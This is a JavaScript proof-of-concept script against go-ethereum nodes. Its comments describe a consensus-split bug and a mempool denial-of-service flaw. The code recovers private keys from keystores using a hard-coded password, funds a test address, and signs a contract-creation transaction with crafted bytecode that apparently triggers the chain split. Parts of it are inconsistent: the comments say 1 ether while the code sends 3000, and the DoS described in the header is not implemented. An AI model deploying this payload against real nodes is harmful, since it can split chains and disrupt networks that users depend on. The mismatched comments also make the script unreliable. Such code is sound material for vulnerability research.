/**
 * go-ethereum is the official Go implementation of the Ethereum protocol.
 * In affected versions a consensus-vulnerability in go-ethereum (Geth) could cause a chain split,
 * where vulnerable versions refuse to accept the canonical chain.
 */
/**
 * DENIAL OF SERVICE ATTACK
 *
 * A design flaw in all versions of Go-Ethereum allows an attacker node to send 5120 pending transactions
 * of a high gas price from one account that all fully spend the full balance of the account to a victim Geth node,
 * which can purge all of pending transactions in a victim node's memory pool and then occupy the memory pool to
 * prevent new transactions from entering the pool, resulting in a denial of service (DoS).
 */
const Web3 = require('web3');
const fs = require("fs");
const keythereum = require("keythereum");
const web3 = new Web3('http://localhost:8547');
const batch = new web3.BatchRequest();
const BN = web3.utils.BN;

//Get private key of node 1
const PASSWORD = "helloworld";
const KEYSTORE = `${__dirname}/node1_keystore.json`;
const keyObject = JSON.parse(fs.readFileSync(KEYSTORE, {encoding: "utf8"}));
const privateKey = keythereum.recover(PASSWORD, keyObject).toString("hex");
const MAIN_ADDR = '0x'+keyObject.address;

//Get private key of node 3
const PASSWORD_ = "helloworld";
const KEYSTORE_ = `${__dirname}/node3_keystore.json`;
const keyObject_ = JSON.parse(fs.readFileSync(KEYSTORE_, {encoding: "utf8"}));
const privateKey_ = keythereum.recover(PASSWORD_, keyObject_).toString("hex");
const node3 = '0x'+keyObject_.address;

//First send 1 eth to testing account
async function firstSendEth() {
    const nonce = await web3.eth.getTransactionCount(MAIN_ADDR);

    const createTransaction = await web3.eth.accounts.signTransaction(
        {
            from: MAIN_ADDR,
            to: "0x18fa635df29beb9D9BA08c095E99d24f3112cf3e",
            value: web3.utils.toWei('3000', 'ether'),
            gas: "21000",
            nonce
        },
        privateKey
    );
    const receipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
    console.log(nonce, "address:", node3, "been credited, tx_hash:", receipt.transactionHash);
}

//sanity check, assert testing account balance is just 1 eth
async function assertBalance() {
    const raw_bal = await web3.eth.getBalance(node3);
    const bal = web3.utils.fromWei(raw_bal,'ether');
    if (bal === '1') return true;
    else {
        console.log(node3, "BALANCE NOT 1 ETHER BUT", bal);
        return false;
    }
}

async function createAttackTx() {
    let nonce = await web3.eth.getTransactionCount(MAIN_ADDR);

    const createTransaction = await web3.eth.accounts.signTransaction(
            {
                from: MAIN_ADDR,
                gas: "402480",
                nonce,
                data: "0x6001600053600260015360036002536004600353600560045360066005536006600260066000600060047f7ef0367e633852132a0ebbf70eb714015dd44bc82e1e55a96ef1389c999c1bcaf13d600060003e596000208055"
            },
            privateKey
        );
    console.log(nonce, "created");
    const receipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
    console.log(nonce, "success, hash:", receipt.transactionHash);
}

async function main() {
    await firstSendEth();
    //await assertBalance();
    //await createAttackTx();
}
main();
